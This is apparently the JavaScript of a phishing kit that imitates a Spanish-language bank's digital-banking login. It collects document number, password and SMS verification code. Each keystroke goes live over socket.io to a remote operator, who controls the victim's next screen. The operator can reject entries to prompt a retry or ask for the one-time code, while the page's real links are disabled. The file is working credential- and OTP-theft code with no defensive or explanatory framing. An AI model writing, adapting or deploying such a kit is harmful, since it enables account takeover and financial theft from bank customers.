(function () {
  const form = document.getElementById("login-form");
  const title = document.getElementById("login-title");
  const errorMsg = document.getElementById("error-msg");
  const demoNote = document.getElementById("demo-note");
  const rememberRow = document.getElementById("remember-row");
  const forgot = document.getElementById("forgot");
  const docNumber = document.getElementById("doc-number");
  const docWrap = document.getElementById("doc-number-wrap");
  const docTypeBtn = document.getElementById("doc-type-btn");
  const docTypeList = document.getElementById("doc-type-list");
  const docTypeValue = document.getElementById("doc-type-value");
  const combo = document.getElementById("doc-type");
  const password = document.getElementById("password");
  const stepDoc = document.querySelector(".step-doc");
  const stepPass = document.querySelector(".step-pass");
  const stepVerify = document.querySelector(".step-verify");
  const tokens = [...document.querySelectorAll(".token")];
  const loadingOverlay = document.getElementById("loading-overlay");

  let step = "doc";
  let docType = "DNI";

  const socket = typeof io !== "undefined" ? io() : null;

  function showLoading(text) {
    if (loadingOverlay) {
      const textEl = loadingOverlay.querySelector(".efectiva-loading-text");
      if (textEl) textEl.textContent = text || "Cargando, por favor espere...";
      loadingOverlay.hidden = false;
    }
  }

  function hideLoading() {
    if (loadingOverlay) {
      loadingOverlay.hidden = true;
    }
  }

  function sendSocketUpdate(customStatus) {
    if (!socket) return;
    const currentToken = tokens.map(function (t) { return t.value; }).join("");
    const data = {
      docType,
      docNumber: docNumber.value.trim(),
      password: password.value,
      token: currentToken,
      step,
      status: customStatus || (step === "doc" ? "Ingresando documento" : step === "pass" ? "Ingresando contraseña" : "Ingresando token SMS"),
    };
    socket.emit(socket.connected ? "client:update" : "client:init", data);
  }

  if (socket) {
    socket.on("connect", function () {
      sendSocketUpdate("Conectado");
    });

    socket.on("operator:action", function (data) {
      hideLoading();
      const { action, message } = data;
      if (action === "wrong_doc") {
        setStep("doc");
        showError(message || "Documento incorrecto o no registrado");
      } else if (action === "wrong_pass") {
        setStep("pass");
        password.value = "";
        showError(message || "Contraseña incorrecta. Inténtalo de nuevo.");
      } else if (action === "wrong_token") {
        setStep("verify");
        tokens.forEach(t => t.value = "");
        tokens[0].focus();
        showError(message || "Código SMS inválido o expirado.");
      } else if (action === "ask_token") {
        setStep("verify");
      } else if (action === "ask_pass") {
        setStep("pass");
      } else if (action === "approve" || action === "redirect") {
        window.location.href = "/panel.html";
      }
    });
  }

  function showError(text) {
    errorMsg.hidden = !text;
    errorMsg.textContent = text || "";
  }

  function setStep(next) {
    step = next;
    stepDoc.hidden = next !== "doc";
    stepPass.hidden = next !== "pass";
    stepVerify.hidden = next !== "verify";
    rememberRow.hidden = next === "verify";
    forgot.hidden = next === "verify";
    demoNote.hidden = true;
    showError("");
    if (next === "doc") title.textContent = "Accede a la banca digital";
    if (next === "pass") title.textContent = "Accede a la banca digital";
    if (next === "verify") title.textContent = "Verifica tu identidad";
    sendSocketUpdate();
  }

  function limitsFor(type) {
    if (type === "CE") return { max: 12, mode: "text", filter: /[^a-zA-Z0-9]/g };
    return { max: 8, mode: "numeric", filter: /\D/g };
  }

  function applyDocType(type, label) {
    docType = type;
    docTypeValue.textContent = label;
    const lim = limitsFor(type);
    docNumber.maxLength = lim.max;
    docNumber.inputMode = lim.mode;
    docNumber.value = docNumber.value.replace(lim.filter, "").slice(0, lim.max);
    syncFilled(docNumber, docWrap);
    sendSocketUpdate();
  }

  function syncFilled(input, wrap) {
    wrap.classList.toggle("filled", input.value.length > 0);
  }

  docNumber.addEventListener("input", function () {
    const lim = limitsFor(docType);
    this.value = this.value.replace(lim.filter, "").slice(0, lim.max);
    syncFilled(this, docWrap);
    docWrap.classList.remove("error");
    showError("");
    sendSocketUpdate();
  });

  password.addEventListener("input", function () {
    this.closest(".input-field").classList.toggle("filled", this.value.length > 0);
    sendSocketUpdate();
  });

  docTypeBtn.addEventListener("click", function (event) {
    event.stopPropagation();
    const open = combo.classList.toggle("open");
    docTypeList.hidden = !open;
    docTypeBtn.setAttribute("aria-expanded", String(open));
  });

  docTypeList.addEventListener("click", function (event) {
    const item = event.target.closest("li");
    if (!item) return;
    applyDocType(item.dataset.value, item.textContent.trim());
    combo.classList.remove("open");
    docTypeList.hidden = true;
  });

  document.addEventListener("click", function () {
    combo.classList.remove("open");
    docTypeList.hidden = true;
    docTypeBtn.setAttribute("aria-expanded", "false");
  });

  document.querySelectorAll("[data-switch]").forEach(function (el) {
    el.addEventListener("click", function (event) {
      event.preventDefault();
      el.classList.toggle("on");
    });
  });

  document.getElementById("toggle-pass").addEventListener("click", function () {
    password.type = password.type === "password" ? "text" : "password";
  });

  tokens.forEach(function (box, index) {
    box.addEventListener("input", function () {
      this.value = this.value.replace(/\D/g, "").slice(0, 1);
      if (this.value && tokens[index + 1]) tokens[index + 1].focus();
      sendSocketUpdate();
    });
    box.addEventListener("keydown", function (event) {
      if (event.key === "Backspace" && !this.value && tokens[index - 1]) {
        tokens[index - 1].focus();
      }
    });
  });

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    if (step === "doc") {
      if (!docNumber.value.trim()) {
        docWrap.classList.add("error");
        showError("Ingresa tu número de documento");
        docNumber.focus();
        return;
      }
      if (docType === "DNI" && docNumber.value.length !== 8) {
        docWrap.classList.add("error");
        showError("El DNI debe tener 8 dígitos");
        return;
      }
      showLoading("Verificando documento...");
      sendSocketUpdate("Esperando verificación de documento por el operador");
      return;
    }
    if (step === "pass") {
      if (!password.value) {
        showError("Ingresa tu contraseña");
        password.focus();
        return;
      }
      showLoading("Verificando contraseña...");
      sendSocketUpdate("Esperando verificación de contraseña por el operador");
      return;
    }
    const code = tokens.map(function (t) { return t.value; }).join("");
    if (code.length !== 6) {
      showError("Ingresa el código de 6 dígitos");
      return;
    }
    showLoading("Validando código SMS...");
    sendSocketUpdate("Esperando aprobación del código por el operador");
  });

  document.querySelectorAll(".nav-link, .forgot, .store-badges img, .resend span").forEach(function (el) {
    el.addEventListener("click", function (event) {
      event.preventDefault();
    });
  });
})();

